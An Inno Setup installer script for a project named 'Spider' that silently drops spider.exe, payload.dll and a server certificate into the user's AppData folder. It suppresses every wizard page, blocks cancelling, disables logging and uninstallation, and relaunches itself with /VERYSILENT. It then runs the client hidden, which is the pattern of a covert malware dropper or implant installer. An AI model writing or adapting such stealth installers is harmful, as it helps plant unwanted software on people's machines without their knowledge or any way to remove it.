; Inno Setup Installer for Spider Project
; -- Spider.iss --

[Setup]
AppName=Spider
AppVersion=0
DefaultDirName={userappdata}\spider
Compression=lzma2
SolidCompression=yes
CreateUninstallRegKey=no
Uninstallable=no
OutputBaseFilename=SpiderSetup
DisableStartupPrompt=yes
DisableDirPage=yes
DisableFinishedPage=yes
DisableProgramGroupPage=yes
DisableReadyPage=yes
DisableWelcomePage=yes
AllowCancelDuringInstall=no
SetupLogging=no

[Code]
#ifdef UNICODE
  #define AW "W"
#else
  #define AW "A"
#endif
type
  HINSTANCE = THandle;

function ShellExecute(hwnd: HWND; lpOperation: string; lpFile: string;
  lpParameters: string; lpDirectory: string; nShowCmd: Integer): HINSTANCE;
  external 'ShellExecute{#AW}@shell32.dll stdcall';

function InitializeSetup: Boolean;
begin
  Result := WizardSilent;
  if not Result then
  begin
    if ShellExecute(0, '', ExpandConstant('{srcexe}'), '/VERYSILENT', '',
      SW_SHOW) <= 32
    then
      Result := True;
  end;
end;

[Files]
Source: "C:/Github/Spider/client/spider/Debug/spider.exe"; DestDir: "{userappdata}/spider"
Source: "C:/Github/Spider/client/spider/Debug/payload.dll"; DestDir: "{userappdata}/spider"
Source: "C:/Github/Spider/client/spider/Debug/server.crt"; DestDir: "{userappdata}/spider"

[Run]
Filename: {userappdata}/spider/spider.exe; Flags: nowait postinstall runhidden